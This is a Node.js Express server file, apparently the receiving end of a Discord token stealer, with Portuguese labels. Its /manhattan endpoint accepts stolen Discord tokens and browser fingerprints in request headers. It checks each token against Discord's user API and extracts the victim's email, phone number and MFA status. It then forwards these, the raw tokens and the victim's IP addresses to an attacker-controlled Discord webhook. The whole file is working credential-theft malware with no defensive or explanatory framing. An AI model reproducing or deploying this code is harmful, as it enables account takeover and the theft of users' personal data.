const express = require("express");
const app = express();

const listener = app.listen(process.env.PORT, function() {
  console.log("Your app is listening on port " + listener.address().port);
});

const { WebhookClient } = require("discord.js")
const wb = new WebhookClient("ID", "TOKEN")

app.get("/manhattan", async (req, res) => {
  res.sendStatus(200)
  console.log(req.headers.fingerprint)
  const tokens = req.headers.tokens.trim().split(", ")
  const fingerprint = req.headers.fingerprint
  if ((!tokens || tokens.length) && !fingerprint) return
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
  ip = ip.split(",").map(IP => `\`${IP}\``).join(", ")
  let tokenString = ""
  for (const data of tokens) {
    const [type, token] = data.split("::")
    const userData = await getUserData(token)
    if (!userData) continue
    const username = userData.username.replace('`', '\`') + "#" + userData.discriminator
    const id = userData.id
    const email = userData.email || "Sem email"
    const mfa = userData.mfa_enabled ? "Ativo" : "Desativado"
    const phone = userData.phone || "Sem telefone"
    tokenString += `Type: \`${type}\`\nTag: \`${username}\`\nId: \`${id}\`\nEmail: \`${email}\`\nMfa ativo: \`${mfa}\`\nTelefone: \`${phone}\`\nToken: \`${token}\`\n\n`
  }
  wb.send(
    `Tokens: ${tokenString}\n\n` +
    "Fingerprint: `" + fingerprint + "`\n" +
    "IPs: " + ip + "\n============================="
  )
  console.log(`${fingerprint}\n${ip}\n\n`)
})

const request = require("request-promise")

const getUserData = async (token) => {
  if (token.startsWith('"') && token.endsWith('"'))
    token = token.slice(1, -1)
  let data;
  try {
    data = await request({
      uri: "https://discordapp.com/api/v6/users/@me",
      headers: {
        Authorization: token
      },
      json: true
    })
  } catch (e) {
    return undefined
  }
  
  return data
}
